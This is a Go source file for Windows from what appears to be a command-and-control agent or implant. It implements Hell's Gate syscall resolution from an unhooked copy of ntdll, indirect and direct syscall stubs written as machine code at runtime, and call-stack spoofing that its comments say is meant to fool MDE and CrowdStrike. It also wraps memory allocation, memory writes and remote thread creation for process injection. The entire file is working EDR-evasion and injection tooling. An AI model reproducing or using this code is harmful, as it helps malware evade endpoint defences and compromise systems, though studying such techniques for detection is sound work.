//go:build windows

package agent

// Hell's Gate — clean SSN resolution + call-stack spoofing.
//
// ── SSN resolution (Hell's Gate) ─────────────────────────────────────────────
//
// Improvement over in-memory Halos Gate: ntdll stubs are read from a source
// that cannot be hooked by an EDR driver before our process starts.
//
// Priority order:
//   1. \KnownDlls\ntdll.dll  — kernel section object, created at boot,
//                              EDR drivers have no opportunity to hook it.
//   2. LoadLibraryEx(disk)   — clean copy from disk, no DllMain/hooks.
//   3. Halos Gate            — in-memory neighbor-scan fallback.
//
// ── Call-stack spoofing ───────────────────────────────────────────────────────
//
// Problem: modern EDRs (MDE, CrowdStrike) validate the call-stack when a
// syscall arrives at the kernel.  Without spoofing, the stack shows:
//
//     ntdll!syscall_gadget          ← syscall executes here (indirect stub)
//     agent!makeSpoofedStub+N       ← our code ← FLAGGED
//     agent!hgAllocateVirtualMemory
//
// With spoofing, the EDR sees:
//
//     ntdll!NtAllocateVirtualMemory  ← syscall executes here
//     ntdll+X                        ← a call-preceded RET in ntdll ← clean ✓
//     <Go runtime>                   ← legitimate continuation
//
// Technique: "sub rsp,8 + planted return" —
//
//   1. sub rsp, 8        — shifts the stack, making room for a fake frame.
//   2. Copy stack args   — args 5+ slide down by 8 to preserve correct offsets.
//   3. Plant spoof_addr  — write a call-preceded RET address in ntdll at [RSP].
//      [RSP+8] still holds the real return address (untouched by sub rsp,8).
//   4. JMP syscall;ret   — indirect execution (syscall inside ntdll).
//
//   After syscall;ret (pops [RSP]=spoof_addr → RSP+8):
//     RIP = spoof_addr  (a `ret` in ntdll, preceded by a CALL instruction)
//     RSP = RSP+8, [RSP] = real_return_to_SyscallN
//   After spoof's ret (pops [RSP]=real_ret → RSP+8):
//     RIP = real_return_to_SyscallN  ✓
//     RSP = original RSP before `call stub`  ✓
//
// No CGo required — all stub bytes are written to an RWX page at runtime.

import (
	"encoding/binary"
	"os"
	"strings"
	"sync"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ── SSN cache ─────────────────────────────────────────────────────────────────

var (
	hgOnce  sync.Once
	hgCache = make(map[string]uint16, 512)
)

// hgSSN returns the syscall number for the named NT function.
// Falls back to Halos Gate neighbor-scan when the clean mapping is unavailable.
func hgSSN(name string) uint16 {
	hgOnce.Do(hgInit)
	if ssn, ok := hgCache[name]; ok {
		return ssn
	}
	return extractSSN(ntdll.NewProc(name))
}

// hgInit tries KnownDlls first, then disk mapping.
func hgInit() {
	if hgInitKnownDlls() && len(hgCache) > 0 {
		return
	}
	hgInitFromDisk()
}

// ── KnownDLLs mapping ─────────────────────────────────────────────────────────
//
// \KnownDlls\ntdll.dll is a section object created by smss.exe at boot from
// the clean on-disk ntdll.  EDR drivers attach their kernel callbacks AFTER
// boot and cannot retroactively hook the KnownDlls section.

// objectAttributes64 mirrors OBJECT_ATTRIBUTES on x64 (48 bytes).
type objectAttributes64 struct {
	Length     uint32
	_          [4]byte // padding
	RootDir    uintptr
	ObjName    uintptr // *UNICODE_STRING
	Attributes uint32
	_          [4]byte
	SecDesc    uintptr
	SecQoS     uintptr
}

// unicodeString64 mirrors UNICODE_STRING on x64 (16 bytes).
type unicodeString64 struct {
	Length    uint16
	MaxLength uint16
	_         [4]byte // padding
	Buffer    uintptr // pointer to UTF-16 data
}

const objCaseInsensitive = 0x00000040
const sectionMapRead = 0x0004

func hgInitKnownDlls() bool {
	// Full NT path to the KnownDlls ntdll section.
	path := `\KnownDlls\ntdll.dll`
	pathU16 := windows.StringToUTF16(path)

	ustr := unicodeString64{
		Length:    uint16(len(path) * 2),
		MaxLength: uint16(len(path)*2 + 2),
		Buffer:    uintptr(unsafe.Pointer(&pathU16[0])),
	}
	oa := objectAttributes64{
		Length:     48,
		ObjName:    uintptr(unsafe.Pointer(&ustr)),
		Attributes: objCaseInsensitive,
	}

	var hSection uintptr
	ntOpenSection := ntdll.NewProc("NtOpenSection")
	r, _, _ := ntOpenSection.Call(
		uintptr(unsafe.Pointer(&hSection)),
		sectionMapRead,
		uintptr(unsafe.Pointer(&oa)),
	)
	if r != 0 {
		return false
	}
	defer procNtClose.Call(hSection)

	var base uintptr
	var size uintptr
	r, _, _ = procNtMapViewOfSection.Call(
		hSection,
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&base)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&size)),
		uintptr(ViewShare),
		0,
		uintptr(windows.PAGE_READONLY),
	)
	if r != 0 {
		return false
	}
	defer procNtUnmapViewOfSection.Call(uintptr(windows.CurrentProcess()), base)

	hgParseExports(base)
	return true
}

// hgInitFromDisk falls back to LoadLibraryEx(DONT_RESOLVE_DLL_REFERENCES).
func hgInitFromDisk() {
	sysroot := os.Getenv("SystemRoot")
	if sysroot == "" {
		sysroot = `C:\Windows`
	}
	pathW, err := windows.UTF16PtrFromString(sysroot + `\System32\ntdll.dll`)
	if err != nil {
		return
	}
	h, _, _ := procLoadLibraryExW.Call(
		uintptr(unsafe.Pointer(pathW)),
		0,
		dontResolveDLLReferences,
	)
	if h == 0 {
		return
	}
	defer windows.FreeLibrary(windows.Handle(h))
	hgParseExports(h)
}

// ── PE export table parser ────────────────────────────────────────────────────

func hgParseExports(base uintptr) {
	defer func() { recover() }()

	elfanew := uintptr(*(*uint32)(unsafe.Pointer(base + 60)))
	peHdr := base + elfanew
	// DataDirectory[0] VirtualAddress: peHdr + 24 (OptHdr) + 112 = peHdr+136
	exportRVA := uintptr(*(*uint32)(unsafe.Pointer(peHdr + 136)))
	if exportRVA == 0 {
		return
	}

	expDir := base + exportRVA
	numNames  := *(*uint32)(unsafe.Pointer(expDir + 0x18))
	rvaFuncs  := base + uintptr(*(*uint32)(unsafe.Pointer(expDir + 0x1C)))
	rvaNames  := base + uintptr(*(*uint32)(unsafe.Pointer(expDir + 0x20)))
	rvaOrds   := base + uintptr(*(*uint32)(unsafe.Pointer(expDir + 0x24)))

	for i := uint32(0); i < numNames; i++ {
		nameAddr := base + uintptr(*(*uint32)(unsafe.Pointer(rvaNames + uintptr(i)*4)))
		name := hgCStr(nameAddr)
		if !strings.HasPrefix(name, "Nt") {
			continue
		}
		ord := *(*uint16)(unsafe.Pointer(rvaOrds + uintptr(i)*2))
		funcRVA := *(*uint32)(unsafe.Pointer(rvaFuncs + uintptr(ord)*4))
		stub := base + uintptr(funcRVA)
		if ssn := hgReadSSN(stub); ssn > 0 {
			hgCache[name] = ssn
		}
	}
}

// hgReadSSN reads the SSN from a clean NT syscall stub.
// Standard:  4C 8B D1  B8 <ssn lo> <ssn hi> 00 00
// Old style: B8 <ssn lo> <ssn hi> 00 00
func hgReadSSN(addr uintptr) uint16 {
	b := (*[8]byte)(unsafe.Pointer(addr))
	if b[0] == 0x4C && b[1] == 0x8B && b[2] == 0xD1 && b[3] == 0xB8 {
		return binary.LittleEndian.Uint16(b[4:6])
	}
	if b[0] == 0xB8 && b[5] == 0x00 && b[6] == 0x00 {
		return binary.LittleEndian.Uint16(b[1:3])
	}
	return 0
}

func hgCStr(addr uintptr) string {
	var b []byte
	for {
		c := *(*byte)(unsafe.Pointer(addr))
		if c == 0 {
			break
		}
		b = append(b, c)
		addr++
	}
	return string(b)
}

// ── Call-stack spoof gadget ───────────────────────────────────────────────────
//
// We need one address in ntdll .text that:
//   (a) Is a RET instruction (0xC3).
//   (b) Is preceded by a CALL rel32 (E8 xx xx xx xx), so [addr-5] == 0xE8.
//
// When planted on the stack, the EDR's stack walker will read [addr-5] == 0xE8
// and conclude this is a valid call-site return address inside ntdll.

var (
	spoofGadget     uintptr  // call-preceded RET in ntdll
	spoofGadgetOnce sync.Once
)

func getSpoofGadget() uintptr {
	spoofGadgetOnce.Do(findSpoofGadget)
	return spoofGadget
}

// findSpoofGadget scans ntdll .text for the pattern: E8 xx xx xx xx C3
// i.e. "call rel32; ret".  The address of the C3 byte is our gadget.
func findSpoofGadget() {
	ntdllH, _ := windows.LoadLibrary("ntdll.dll")
	if ntdllH == 0 {
		return
	}
	base := uintptr(ntdllH)

	dosHdr := (*[64]byte)(unsafe.Pointer(base))
	elfanew := binary.LittleEndian.Uint32(dosHdr[60:])
	peHdr := base + uintptr(elfanew)
	hdr := (*[248]byte)(unsafe.Pointer(peHdr))
	numSects := binary.LittleEndian.Uint16(hdr[6:])
	optSz := binary.LittleEndian.Uint16(hdr[20:])
	sectBase := peHdr + 24 + uintptr(optSz)

	for i := uintptr(0); i < uintptr(numSects); i++ {
		sect := sectBase + i*40
		name := string((*[8]byte)(unsafe.Pointer(sect))[:])
		if !strings.HasPrefix(name, ".text") {
			continue
		}
		vaddr := binary.LittleEndian.Uint32((*[40]byte)(unsafe.Pointer(sect))[12:])
		vsz   := binary.LittleEndian.Uint32((*[40]byte)(unsafe.Pointer(sect))[16:])
		start := base + uintptr(vaddr)

		// Scan for E8 xx xx xx xx C3 (call rel32 immediately followed by ret)
		for off := uintptr(5); off+1 <= uintptr(vsz); off++ {
			if *(*byte)(unsafe.Pointer(start+off-5)) == 0xE8 &&
				*(*byte)(unsafe.Pointer(start+off)) == 0xC3 {
				spoofGadget = start + off
				return
			}
		}
	}
}

// ── Spoofed indirect stub ─────────────────────────────────────────────────────
//
// Layout (110 bytes, per syscall):
//
//  +0   48 83 EC 08               sub  rsp, 8            ; make room for fake frame
//  +4   4C 8B 5C 24 30            mov  r11,[rsp+0x30]    ─┐
//  +9   4C 89 5C 24 28            mov  [rsp+0x28],r11     │ copy args 5-11
// +14   4C 8B 5C 24 38            mov  r11,[rsp+0x38]     │ (shift each down 8 bytes
// +19   4C 89 5C 24 30            mov  [rsp+0x30],r11     │  to correct for the sub)
// +24   4C 8B 5C 24 40            mov  r11,[rsp+0x40]     │
// +29   4C 89 5C 24 38            mov  [rsp+0x38],r11     │
// +34   4C 8B 5C 24 48            mov  r11,[rsp+0x48]     │
// +39   4C 89 5C 24 40            mov  [rsp+0x40],r11     │
// +44   4C 8B 5C 24 50            mov  r11,[rsp+0x50]     │
// +49   4C 89 5C 24 48            mov  [rsp+0x48],r11     │
// +54   4C 8B 5C 24 58            mov  r11,[rsp+0x58]     │
// +59   4C 89 5C 24 50            mov  [rsp+0x50],r11     │
// +64   4C 8B 5C 24 60            mov  r11,[rsp+0x60]     │
// +69   4C 89 5C 24 58            mov  [rsp+0x58],r11    ─┘
// +74   49 BB ss ss ss ss         mov  r11, spoof_addr    ; load call-preceded RET
//       ss ss ss ss
// +84   4C 89 1C 24               mov  [rsp], r11         ; plant as fake return addr
// +88   4C 8B D1                  mov  r10, rcx           ; NT calling convention
// +91   B8 xx xx 00 00            mov  eax, SSN
// +96   FF 25 00 00 00 00         jmp  [rip+0]            ; → ntdll syscall;ret gadget
// +102  gg gg gg gg gg gg gg gg  <gadget address>
//
// Stack state at SYSCALL instruction (as seen by EDR):
//   [RSP+0]  = spoof_addr (call-preceded RET in ntdll) ← EDR sees valid ntdll call-site ✓
//   [RSP+8]  = ret_to_SyscallN    (preserved by sub rsp,8; untouched)
//   [RSP+10] = shadow space …
//   [RSP+28] = arg5 (fixed by copy loop)
//
// After syscall;ret:
//   RSP += 8, RIP = spoof_addr (the C3 RET)
//   RET at spoof_addr: RSP += 8, RIP = ret_to_SyscallN  ← correct ✓
//   Final RSP = RSP_before_call_stub + 8 = caller's original RSP ✓

const spoofedStubSize = 110

var (
	spoofedStubMem  uintptr
	spoofedStubOff  uintptr
	spoofedStubCache = map[uint16]uintptr{}
	spoofedStubMu    sync.Mutex
)

func initSpoofedPage() {
	if spoofedStubMem != 0 {
		return
	}
	var addr uintptr
	size := uintptr(0x2000) // 8KB → 72 stubs max
	r, _, _ := procNtAllocateVirtualMemory.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&addr)),
		0,
		uintptr(unsafe.Pointer(&size)),
		uintptr(windows.MEM_RESERVE|windows.MEM_COMMIT),
		uintptr(windows.PAGE_READWRITE),
	)
	if r != 0 {
		return
	}
	spoofedStubMem = addr
}

// makeSpoofedStub returns (and caches) a spoofed indirect syscall stub.
func makeSpoofedStub(ssn uint16) uintptr {
	spoofedStubMu.Lock()
	defer spoofedStubMu.Unlock()

	if addr, ok := spoofedStubCache[ssn]; ok {
		return addr
	}

	initIndirect()
	initSpoofedPage()
	if spoofedStubMem == 0 || syscallGadget == 0 {
		return 0
	}
	sg := getSpoofGadget()
	if sg == 0 {
		// No spoof gadget found — fall back to plain indirect stub
		return makeStub(ssn)
	}

	addr := spoofedStubMem + spoofedStubOff
	spoofedStubOff += spoofedStubSize

	// Flip to RW
	var old uint32
	a, sz := addr, uintptr(spoofedStubSize)
	procNtProtectVirtualMemory.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&a)),
		uintptr(unsafe.Pointer(&sz)),
		uintptr(windows.PAGE_READWRITE),
		uintptr(unsafe.Pointer(&old)),
	)

	s := (*[spoofedStubSize]byte)(unsafe.Pointer(addr))

	// +0: sub rsp, 8
	s[0] = 0x48; s[1] = 0x83; s[2] = 0xEC; s[3] = 0x08

	// +4..+73: copy args 5-11 (7 pairs × 10 bytes)
	// Each pair: mov r11,[rsp+src] then mov [rsp+dst],r11
	// src offsets after sub: 0x30,0x38,0x40,0x48,0x50,0x58,0x60
	// dst offsets:           0x28,0x30,0x38,0x40,0x48,0x50,0x58
	argCopies := [7][2]byte{
		{0x30, 0x28}, {0x38, 0x30}, {0x40, 0x38}, {0x48, 0x40},
		{0x50, 0x48}, {0x58, 0x50}, {0x60, 0x58},
	}
	off := 4
	for _, pair := range argCopies {
		// mov r11, [rsp+src]  =  4C 8B 5C 24 src
		s[off+0] = 0x4C; s[off+1] = 0x8B; s[off+2] = 0x5C; s[off+3] = 0x24; s[off+4] = pair[0]
		// mov [rsp+dst], r11  =  4C 89 5C 24 dst
		s[off+5] = 0x4C; s[off+6] = 0x89; s[off+7] = 0x5C; s[off+8] = 0x24; s[off+9] = pair[1]
		off += 10
	}
	// off == 74

	// +74: mov r11, spoof_addr  =  49 BB <8 bytes>
	s[74] = 0x49; s[75] = 0xBB
	binary.LittleEndian.PutUint64(s[76:], uint64(sg))
	// +84: mov [rsp], r11  =  4C 89 1C 24
	s[84] = 0x4C; s[85] = 0x89; s[86] = 0x1C; s[87] = 0x24

	// +88: mov r10, rcx  =  4C 8B D1
	s[88] = 0x4C; s[89] = 0x8B; s[90] = 0xD1
	// +91: mov eax, SSN  =  B8 lo hi 00 00
	s[91] = 0xB8; s[92] = byte(ssn); s[93] = byte(ssn >> 8); s[94] = 0; s[95] = 0
	// +96: jmp [rip+0]  =  FF 25 00 00 00 00
	s[96] = 0xFF; s[97] = 0x25; s[98] = 0; s[99] = 0; s[100] = 0; s[101] = 0
	// +102: gadget address
	binary.LittleEndian.PutUint64(s[102:], uint64(syscallGadget))

	// Flip to RX
	procNtProtectVirtualMemory.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&a)),
		uintptr(unsafe.Pointer(&sz)),
		uintptr(windows.PAGE_EXECUTE_READ),
		uintptr(unsafe.Pointer(&old)),
	)

	spoofedStubCache[ssn] = addr
	return addr
}

// ── bestStub: stub selection ──────────────────────────────────────────────────
//
// Priority: spoofed indirect > plain indirect > direct.
// Spoofed indirect: syscall in ntdll + fake call-stack frame.
// Plain indirect:   syscall in ntdll, no stack spoofing.
// Direct:           syscall in agent page (fallback when ntdll gadget absent).

func bestStub(ssn uint16) uintptr {
	if ssn == 0 {
		return 0
	}
	initIndirect()
	if syscallGadget != 0 && getSpoofGadget() != 0 {
		return makeSpoofedStub(ssn)
	}
	if syscallGadget != 0 {
		return makeStub(ssn)
	}
	return makeDirectStub(ssn)
}

// ── Direct syscall stub (last-resort fallback) ────────────────────────────────
//
// syscall instruction is in the agent's own allocation — not in ntdll.
// Bypasses hook-based EDRs but fails EDRs that check syscall call-stack origin.
//
// Stub: mov r10,rcx | mov eax,SSN | syscall | ret  (10 bytes)

const directStubSize = 10

var (
	directStubMem uintptr
	directStubOff uintptr
)

func initDirect() {
	if directStubMem != 0 {
		return
	}
	var addr uintptr
	size := uintptr(0x1000)
	r, _, _ := procNtAllocateVirtualMemory.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&addr)),
		0,
		uintptr(unsafe.Pointer(&size)),
		uintptr(windows.MEM_RESERVE|windows.MEM_COMMIT),
		uintptr(windows.PAGE_READWRITE),
	)
	if r != 0 {
		return
	}
	directStubMem = addr
}

func makeDirectStub(ssn uint16) uintptr {
	initDirect()
	if directStubMem == 0 {
		return 0
	}
	addr := directStubMem + directStubOff
	directStubOff += directStubSize

	var old uint32
	a, sz := addr, uintptr(directStubSize)
	procNtProtectVirtualMemory.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&a)),
		uintptr(unsafe.Pointer(&sz)),
		uintptr(windows.PAGE_READWRITE),
		uintptr(unsafe.Pointer(&old)),
	)

	s := (*[directStubSize]byte)(unsafe.Pointer(addr))
	s[0] = 0x4C; s[1] = 0x8B; s[2] = 0xD1 // mov r10, rcx
	s[3] = 0xB8                              // mov eax,
	s[4] = byte(ssn); s[5] = byte(ssn >> 8) //   SSN
	s[6] = 0; s[7] = 0
	s[8] = 0x0F; s[9] = 0x05                // syscall; (no ret — SyscallN handles return)

	procNtProtectVirtualMemory.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&a)),
		uintptr(unsafe.Pointer(&sz)),
		uintptr(windows.PAGE_EXECUTE_READ),
		uintptr(unsafe.Pointer(&old)),
	)
	return addr
}

// ── Hell's Gate NT wrappers ───────────────────────────────────────────────────
//
// These use hgSSN (clean resolution) + bestStub (spoofed execution).
// Called from inject_windows.go / commands_windows.go as drop-in replacements.

func hgAllocateVirtualMemory(process windows.Handle, addr *uintptr, size *uintptr, allocType, protect uint32) error {
	ssn  := hgSSN("NtAllocateVirtualMemory")
	stub := bestStub(ssn)
	if stub == 0 {
		r, _, _ := procNtAllocateVirtualMemory.Call(
			uintptr(process), uintptr(unsafe.Pointer(addr)), 0,
			uintptr(unsafe.Pointer(size)), uintptr(allocType), uintptr(protect),
		)
		return ntStatus(r)
	}
	r, _, _ := syscall.SyscallN(stub,
		uintptr(process), uintptr(unsafe.Pointer(addr)), 0,
		uintptr(unsafe.Pointer(size)), uintptr(allocType), uintptr(protect),
	)
	return ntStatus(r)
}

func hgWriteVirtualMemory(process windows.Handle, baseAddr uintptr, buf []byte) error {
	ssn  := hgSSN("NtWriteVirtualMemory")
	stub := bestStub(ssn)
	var written uintptr
	if stub == 0 {
		r, _, _ := ntdll.NewProc("NtWriteVirtualMemory").Call(
			uintptr(process), baseAddr,
			uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)),
			uintptr(unsafe.Pointer(&written)),
		)
		return ntStatus(r)
	}
	r, _, _ := syscall.SyscallN(stub,
		uintptr(process), baseAddr,
		uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)),
		uintptr(unsafe.Pointer(&written)),
	)
	return ntStatus(r)
}

func hgCreateThreadEx(process windows.Handle, startAddr, param uintptr) (windows.Handle, error) {
	const allAccess = 0x001FFFFF
	ssn  := hgSSN("NtCreateThreadEx")
	stub := bestStub(ssn)
	var threadH uintptr
	if stub == 0 {
		r, _, _ := procNtCreateThreadEx.Call(
			uintptr(unsafe.Pointer(&threadH)), allAccess, 0,
			uintptr(process), startAddr, param,
			0, 0, 0, 0, 0,
		)
		return windows.Handle(threadH), ntStatusErr(r)
	}
	r, _, _ := syscall.SyscallN(stub,
		uintptr(unsafe.Pointer(&threadH)), allAccess, 0,
		uintptr(process), startAddr, param,
		0, 0, 0, 0, 0,
	)
	return windows.Handle(threadH), ntStatusErr(r)
}

func ntStatus(r uintptr) error {
	if r == 0 {
		return nil
	}
	return syscall.Errno(r)
}

func ntStatusErr(r uintptr) error { return ntStatus(r) }

// getSpoofGadgetAddr returns the address of the call-preceded RET gadget used for
// return address spoofing. Returns 0 if not found or not initialized.
func getSpoofGadgetAddr() uintptr {
	return getSpoofGadget()
}
